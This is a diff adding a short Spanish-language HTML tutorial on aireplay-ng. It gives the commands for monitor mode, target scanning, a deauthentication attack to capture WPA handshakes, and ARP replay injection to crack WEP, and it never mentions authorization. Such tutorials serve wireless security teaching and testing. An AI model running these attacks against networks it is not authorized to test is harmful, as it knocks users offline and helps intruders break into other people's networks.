@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tutorial de Aireplay-ng</title>
+    <style>
+        @page {
+            size: A4;
+            margin: 15mm 12mm;
+            background-color: #ffffff;
+        }
+
+        body {
+            font-family: sans-serif;
+            line-height: 1.6;
+            color: #000000;
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff;
+        }
+
+        h1,
+        h2,
+        h3 {
+            color: #000000;
+        }
+
+        pre {
+            background-color: #161616;
+            color: #f4f4f4;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: auto;
+        }
+
+        li {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Tutorial de Aireplay-ng: Inyección de Paquetes</h1>
+        <p>Aireplay-ng es una herramienta incluida en la suite Aircrack-ng, utilizada principalmente para inyectar
+            paquetes en redes inalámbricas. Esto es fundamental para ataques de desautenticación o para acelerar la
+            captura de IVs (vectores de inicialización) para romper cifrados WEP o forzar el handshake WPA.</p>
+
+        <h2>Prerrequisitos</h2>
+        <ul>
+            <li>Tener instalada la suite aircrack-ng.</li>
+            <li>Una tarjeta de red inalámbrica que soporte modo monitor e inyección.</li>
+            <li>Poner la interfaz en modo monitor.</li>
+        </ul>
+
+        <h2>Paso 1: Activar Modo Monitor</h2>
+        <p>Primero, identifica tu interfaz (ej. wlan0) y ponla en modo monitor:</p>
+        <pre><code>sudo airmon-ng start wlan0</code></pre>
+        <p>Esto creará una interfaz virtual llamada <code>wlan0mon</code>.</p>
+
+        <h2>Paso 2: Capturar paquetes (Necesario para atacar)</h2>
+        <p>Para inyectar, necesitas conocer el BSSID del objetivo y el canal. Usa airodump-ng:</p>
+        <pre><code>sudo airodump-ng wlan0mon</code></pre>
+
+        <h2>Paso 3: Realizar un ataque de desautenticación</h2>
+        <p>Este ataque desconecta a los clientes del punto de acceso para forzar una reconexión, permitiendo capturar el
+            <i>handshake</i>:</p>
+        <pre><code>sudo aireplay-ng --deauth 5 -a [BSSID_DEL_ROUTER] wlan0mon</code></pre>
+        <p>Donde <code>5</code> es el número de paquetes de desautenticación enviados.</p>
+
+        <h2>Paso 4: Inyección de paquetes (ARP Request Replay)</h2>
+        <p>Para redes WEP, este ataque inyecta paquetes para generar tráfico y obtener IVs rápidamente:</p>
+        <pre><code>sudo aireplay-ng -3 -b [BSSID_DEL_ROUTER] -h [MAC_DEL_CLIENTE_ASOCIADO] wlan0mon</code></pre>
+        <p>Nota: Es necesario que haya un cliente asociado a la red para este ataque.</p>
+    </div>
+</body>
+
+</html>
